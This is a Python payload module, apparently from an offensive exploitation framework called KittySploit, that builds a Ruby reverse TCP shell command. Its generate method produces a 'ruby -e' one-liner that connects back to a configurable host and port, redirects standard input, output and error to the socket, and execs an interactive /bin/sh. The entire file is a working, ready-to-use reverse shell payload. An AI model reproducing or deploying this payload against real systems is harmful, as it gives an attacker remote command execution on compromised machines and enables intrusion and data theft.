from kittysploit import *


class Module(Payload):

    __info__ = {
        'name': 'Unix Command Shell, Reverse TCP (via Ruby)',
        'description': 'Connect back and create a command shell via Ruby TCPSocket',
        'author': 'KittySploit Team',
        'category': PayloadCategory.CMD,
        'arch': Arch.OTHER,
        'platform': Platform.UNIX,
        'listener': 'listeners/multi/reverse_tcp',
        'handler': Handler.REVERSE,
        'session_type': SessionType.SHELL
    }

    lhost = OptString('127.0.0.1', 'Connect to IP address', True)
    lport = OptPort(4444, 'Connect to port', True)
    shell_binary = OptString('/bin/sh', 'The system shell in use', True, True)
    ruby_binary = OptString('ruby', 'Ruby binary', True)
    encoder = OptString('', 'Encoder', False, True)

    def generate(self):
        shell = str(self.shell_binary).replace("\\", "\\\\").replace("'", "\\'")
        code = (
            "require 'socket';"
            f"s=TCPSocket.new('{self.lhost}',{int(self.lport)});"
            "STDIN.reopen(s);STDOUT.reopen(s);STDERR.reopen(s);"
            f"exec('{shell}','-i')"
        )
        escaped = code.replace("'", "'\"'\"'")
        return f"{self.ruby_binary} -e '{escaped}'"
